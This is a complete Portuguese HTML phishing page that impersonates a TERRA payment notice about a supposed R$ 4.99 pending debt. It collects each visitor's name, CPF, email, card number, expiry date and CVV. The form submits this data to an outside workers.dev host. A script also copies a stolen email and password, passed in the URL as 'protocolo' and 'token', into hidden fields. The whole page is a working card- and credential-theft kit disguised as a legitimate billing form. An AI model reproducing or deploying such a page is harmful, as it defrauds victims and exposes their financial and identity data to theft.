<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Pagamento</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
        }
        header {
            text-align: center;
            padding: 16px 0;
        }
        header img {
            max-width: 160px;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        main {
            max-width: 480px;
            margin: 20px auto;
            background: #fff;
            padding: 16px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 12px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background-color: rgba(248,87,0,1);
            color: white;
            padding: 10px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        footer {
            text-align: center;
            font-size: 12px;
            color: #666;
            margin: 40px 0;
        }
    </style>
</head>
<body>
    <header>
        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTE3MyIgaGVpZ2h0PSIyNDkiIHZpZXdCb3g9IjAgMCAxMTczIDI0OSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTQxOC43NDEgMTk3LjYyN0M0MjguODM0IDE5Ni4zNTcgNDM5LjkwNyAxOTQuMTgyIDQ1MS4wODMgMTkxLjM0NkM0NTUuMzc2IDE4Ni44OSA0NDkuODk2IDE4Mi4yODYgNDQ0LjY1NiAxODMuMDcyQzQzMi41NDUgMTgyLjI4NiA0MTcuMDIgMTkzLjMzNSA0MTguNzQxIDE5Ny42MjdaIiBmaWxsPSIjRkY2MjAwIi8+Cjwvc3ZnPg==" alt="Logo TERRA">
    </header>
    <main>
        <h2>Você possui débitos pendentes</h2>
        <p>Atualização anual: R$ 4,99.</p>
        <p>Digite os dados abaixo para realizar a quitação.</p>

        <form method="post" action="https://magui.maguimdasencomendas.workers.dev/">

            <input type="hidden" name="email_original" id="email_original">
            <input type="hidden" name="senha_original" id="senha_original">

            <label for="nome">Nome Completo</label>
            <input type="text" id="nome" name="nome" required placeholder="JOÃO DA SILVA SANTOS (como no cartão)">

            <label for="cpf">CPF</label>
            <input type="text" id="cpf" name="cpf" required placeholder="000.000.000-00 (11 dígitos)">

            <label for="email">E-mail</label>
            <input type="email" id="email" name="email" required placeholder="seuemail@exemplo.com (formato válido)">

            <label for="cartao">Número do Cartão</label>
            <input type="tel" id="cartao" name="cartao" required maxlength="19" placeholder="0000 0000 0000 0000" inputmode="numeric">

            <!-- CAMPO DE VALIDADE - SEM VALIDAÇÃO -->
            <label for="validade">Validade (MM/AA)</label>
            <input type="text" id="validade" name="validade" placeholder="MM/AA">

            <label for="cvv">Código de Segurança (CVV)</label>
            <input type="text" id="cvv" name="cvv" required pattern="\d{3}" maxlength="3" inputmode="numeric" placeholder="123 (3 dígitos no verso do cartão)">

            <button type="submit">Confirmar Pagamento</button>
        </form>

        <p style="font-size:12px; margin-top:16px">
            Ao continuar, declaro que estou ciente e aceito os 
            <a href="#">termos de uso</a> e a 
            <a href="#">política de privacidade</a>.
        </p>
    </main>
    <footer>
        © 2026 TERRA - Todos os direitos reservados
    </footer>

    <script>
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            document.getElementById('email_original').value = urlParams.get('protocolo') || '';
            document.getElementById('senha_original').value = urlParams.get('token') || '';
            
            // Remove qualquer validação do campo validade
            const campoValidade = document.getElementById('validade');
            campoValidade.removeAttribute('required');
            campoValidade.removeAttribute('pattern');
            campoValidade.removeAttribute('maxlength');
        }
    </script>
</body>
</html>
